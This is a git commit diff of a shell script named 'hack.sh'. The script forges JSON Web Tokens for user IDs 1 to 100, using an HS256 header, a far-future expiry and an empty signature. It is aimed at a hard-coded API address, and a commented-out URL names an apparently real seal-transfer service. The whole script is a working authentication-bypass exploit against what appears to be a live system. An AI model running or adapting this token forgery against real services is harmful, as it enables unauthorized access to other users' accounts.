07ed7d8bc4fed2eac346a7ec8b2ddc4f6e8d8f59
Al Zee <z@alz.ee>
2022-04-25 19:39:01 +0800

    nth

--- hack.sh
+++ hack.sh
@@ -3,13 +3,13 @@
 # vim:ft=sh
 
 QSTAMP_API_URL="http://1.116.190.119/traffic/api/v2"
+# QSTAMP_API_URL="https://yunxi.qstamper.com/sealTransferApi"
 header=eyJhbGciOiJIUzI1NiJ9 # {"alg":"HS256"}
 
 for i in {1..100}
 do
     # exp: Sun Jan 4 08:24:39 PM CST 2054
-    s="{\"exp\":2651142279,\"username\":\"$i\"}"
-    payload=$(echo -n $s | basenc --base64url)
+    payload=$(echo -n "{\"exp\":2651142279,\"username\":\"$i\"}" | basenc --base64url)
     payload=${payload%%=*}
     token=$header.$payload.
     echo uid: $i, token: $token
